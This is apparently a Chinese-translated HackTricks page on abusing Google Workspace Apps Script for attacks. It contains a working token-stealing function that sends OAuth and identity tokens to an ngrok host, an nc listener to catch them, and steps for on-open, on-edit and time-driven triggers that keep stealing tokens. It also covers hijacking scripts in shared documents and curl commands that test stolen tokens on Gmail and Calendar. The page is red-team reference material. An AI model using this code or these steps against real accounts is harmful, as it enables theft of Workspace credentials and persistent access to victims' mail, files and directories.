# GWS - App 脚本

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**上关注我。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## App 脚本

App 脚本是**当具有编辑权限的用户访问与 App 脚本链接的文档时将被触发的代码**，并在**接受 OAuth 提示后**。\
它们也可以被设置为由 App 脚本的所有者**每隔一定时间执行**（持久性）。

### 创建 App 脚本

创建 App 脚本有几种方法，尽管最常见的是**从 Google 文档（任何类型）**和作为**独立项目**：

<details>

<summary>从 Google Docs、Sheets 或 Slides 创建一个容器绑定项目</summary>

1. 打开 Docs 文档、Sheets 电子表格或 Slides 演示文稿。
2. 点击 **扩展** > **Google Apps 脚本**。
3. 在脚本编辑器中，点击 **无标题项目**。
4. 为您的项目命名并点击 **重命名**。

</details>

<details>

<summary>创建一个独立项目</summary>

从 Apps 脚本创建一个独立项目：

1. 访问 [`script.google.com`](https://script.google.com/)。
2. 点击添加 **新项目**。
3. 在脚本编辑器中，点击 **无标题项目**。
4. 为您的项目命名并点击 **重命名**。

</details>

<details>

<summary>从 Google Drive 创建一个独立项目</summary>

1. 打开 [Google Drive](https://drive.google.com/)。
2. 点击 **新建** > **更多** > **Google Apps 脚本**。

</details>

<details>

<summary>从 Google Forms 创建一个容器绑定项目</summary>

1. 在 Google Forms 中打开一个表单。
2. 点击更多 more\_vert > **脚本编辑器**。
3. 在脚本编辑器中，点击 **无标题项目**。
4. 为您的项目命名并点击 **重命名**。

</details>

<details>

<summary>使用 clasp 命令行工具创建一个独立项目</summary>

`clasp` 是一个命令行工具，允许您从终端创建、拉取/推送和部署 Apps 脚本项目。

有关更多详细信息，请参阅 [使用 `clasp` 的命令行界面指南](https://developers.google.com/apps-script/guides/clasp)。

</details>

## App 脚本场景 <a href="#create-using-clasp" id="create-using-clasp"></a>

### 使用 App 脚本创建 Google 表格

首先创建一个 App 脚本，我对这个场景的建议是创建一个 Google 表格并转到 **`扩展 > App 脚本`**，这将为您打开一个**链接到表格的新 App 脚本**。

### 泄露令牌

为了访问 OAuth 令牌，您需要点击 **`服务 +` 并添加范围，如**：

* **AdminDirectory**：访问目录的用户和组（如果用户有足够的权限）
* **Gmail**：访问 Gmail 数据
* **Drive**：访问 Drive 数据
* **Google Sheets API**：以便与触发器一起工作

要更改您自己的**所需范围**，您可以转到项目设置并**启用显示编辑器中的“appsscript.json”清单文件**。

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
```plaintext
要捕获请求，您只需运行：
```
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
请求执行App Script的权限：

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
由于发出了外部请求，OAuth提示也将**请求权限以访问外部端点**。
{% endhint %}

### 创建触发器

App准备就绪后，点击**⏰ 触发器**来创建一个触发器。作为**函数**运行选择**`getToken`**，在部署时选择**`Head`**，在事件源中选择**`来自电子表格`**，在事件类型中选择**`打开时`**或**`编辑时`**（根据您的需求），然后保存。

请注意，如果您想调试某些内容，可以在**执行标签中检查App Scripts的运行情况**。

### 分享

为了**触发** **App Script**，受害者需要以**编辑者权限**连接。

总结来说，如果创建者和被邀请用户**来自同一组织**，**OAuth** **令牌**将**属于**访问文件的**用户**。\
如果他们来自**不同的组织**，**令牌**将始终属于**触发器的创建者**，并且只有在创建触发器时给予的**OAuth权限**。

{% hint style="success" %}
用于执行**App Script**的**令牌**将是**触发器创建者**的令牌，即使其他用户以编辑者身份打开文件也是如此。
{% endhint %}

### 滥用共享给我的文档

{% hint style="danger" %}
如果有人**与您共享了一个包含App Scripts和使用App Script Head**的触发器的文档（不是固定部署），您可以修改App Script代码（例如添加窃取令牌功能），访问它，**App Script将以与您共享文档的用户的权限执行**！（请注意，所有者的OAuth令牌将具有创建触发器时给予的访问范围）。

**脚本创建者将收到通知，表明有人修改了脚本**（如何使用gmail权限生成过滤器以防止警报？）
{% endhint %}

{% hint style="success" %}
如果**攻击者修改了App Script的范围**，更新将**不会应用**到文档中，直到创建了一个包含更改的**新触发器**。因此，攻击者将无法窃取所有者创建者的令牌，其范围超出了他在创建的触发器中设置的范围。
{% endhint %}

### 复制而不是分享

当您创建一个分享文档的链接时，会创建类似这样的链接：`https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
如果您**更改**结尾的**"/edit"**为**"/copy"**，而不是访问它，谷歌会询问您是否要**生成文档的副本：**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

如果用户复制并访问它，**文档的内容和App Scripts都将被复制**，但是**触发器不会**，因此**不会执行任何操作**。

### 作为Web应用程序分享

请注意，也可以**将App Script作为Web应用程序分享**（在App Script的编辑器中，部署为Web应用程序），但会出现这样的警告：

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

接着是**典型的OAuth提示**，请求所需的权限。

### 测试

您可以使用以下命令测试收集到的令牌以列出电子邮件：

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
用户的日历列表：
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script 作为持久性

一种持久性的选项是**创建一个文档并为getToken函数添加触发器**，然后与攻击者共享文档，这样每次攻击者打开文件时，他都会**窃取受害者的令牌。**

也可以创建一个App Script并使其每隔X时间触发（如每分钟、每小时、每天...）。一个已经**获取了受害者凭证或会话的攻击者可以设置一个App Script时间触发器，并且每天泄露一个非常有权限的OAuth令牌**：

只需创建一个App Script，转到触发器，点击添加触发器，然后选择事件源为Time-driven并选择最适合你的选项：

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
这将创建一个安全警报电子邮件和一个推送消息到你的手机，提醒你这个情况。
{% endhint %}



### 共享文档未验证提示绕过

此外，如果有人与你**共享**了一个具有**编辑权限**的文档，你可以在文档内生成**App Scripts**，而文档的**所有者（创建者）将成为App Script的所有者**。

{% hint style="warning" %}
这意味着，文档的**创建者将显示为任何有编辑权限的人在其中创建的任何App Script的创建者**。

这也意味着**App Script将被文档创建者的Workspace环境信任**。
{% endhint %}

{% hint style="danger" %}
这也意味着，如果一个**App Script已经存在**并且人们已经**授予访问权限**，任何拥有文档**编辑**权限的人都可以**修改它并滥用该访问权限**。\
要滥用这个，你还需要人们触发App Script。一个巧妙的技巧是**将脚本发布为一个web应用**。当已经授予**访问权限**的**人们**访问网页时，他们将**触发App Script**（使用`<img>`标签也有效）。
{% endhint %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
